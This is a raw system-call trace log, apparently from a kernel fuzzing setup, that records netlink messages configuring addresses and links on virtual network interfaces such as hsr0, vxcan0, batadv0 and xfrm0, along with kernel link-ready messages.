[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x31\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x23\x08\x00\x01\x00\xac\x14\x14\x23&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;hsr0&quot;, ifr_ifindex=49}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x31\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x23\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x23&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;hsr0&quot;, ifr_ifindex=49}) = 0
[pid  5086] close(4)                    = 0
[   77.235455][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): hsr_slave_0: link becomes ready
[   77.257830][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_hsr: link becomes ready
[   77.266304][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): hsr_slave_1: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x31\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;dummy0&quot;, ifr_ifindex=17}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x11\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x24\x08\x00\x01\x00\xac\x14\x14\x24&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;dummy0&quot;, ifr_ifindex=17}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x11\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;dummy0&quot;, ifr_ifindex=17}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x24\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;nlmon0&quot;, ifr_ifindex=18}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x12\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x25\x08\x00\x01\x00\xac\x14\x14\x25&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;nlmon0&quot;, ifr_ifindex=18}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x12\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x25\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x25&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;nlmon0&quot;, ifr_ifindex=18}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x12\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vxcan0&quot;, ifr_ifindex=21}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x15\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x26\x08\x00\x01\x00\xac\x14\x14\x26&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vxcan0&quot;, ifr_ifindex=21}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x15\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vxcan1&quot;, ifr_ifindex=22}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x16\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x27\x08\x00\x01\x00\xac\x14\x14\x27&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[   77.290845][ T5086] IPv6: ADDRCONF(NETDEV_CHANGE): hsr0: link becomes ready
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;vxcan1&quot;, ifr_ifindex=22}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x16\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;caif0&quot;, ifr_ifindex=19}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x13\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x28\x08\x00\x01\x00\xac\x14\x14\x28&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;caif0&quot;, ifr_ifindex=19}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x13\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x28&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;caif0&quot;, ifr_ifindex=19}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x13\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x28\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=64, nlmsg_type=NLMSG_ERROR, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, {error=-EOPNOTSUPP, msg=[{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x13\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x28\x00\x00&quot;]}], 4096, 0, NULL, NULL) = 64
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv0&quot;, ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x14\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x29\x08\x00\x01\x00\xac\x14\x14\x29&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv0&quot;, ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x14\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x29\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x29&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv0&quot;, ifr_ifindex=20}) = 0
[pid  5086] close(4)                    = 0
[   77.353880][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): vxcan1: link becomes ready
[   77.362007][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): vxcan0: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x14\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x29\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;netdevsim0&quot;, ifr_ifindex=67}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x43\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2a\x08\x00\x01\x00\xac\x14\x14\x2a&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;netdevsim0&quot;, ifr_ifindex=67}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x43\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2a\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2a&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;netdevsim0&quot;, ifr_ifindex=67}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x43\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2a\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;xfrm0&quot;, ifr_ifindex=44}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x2c\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x2b\x08\x00\x01\x00\xac\x14\x14\x2b&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;xfrm0&quot;, ifr_ifindex=44}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x2c\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2b\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2b&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;xfrm0&quot;, ifr_ifindex=44}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x2c\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x2b\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
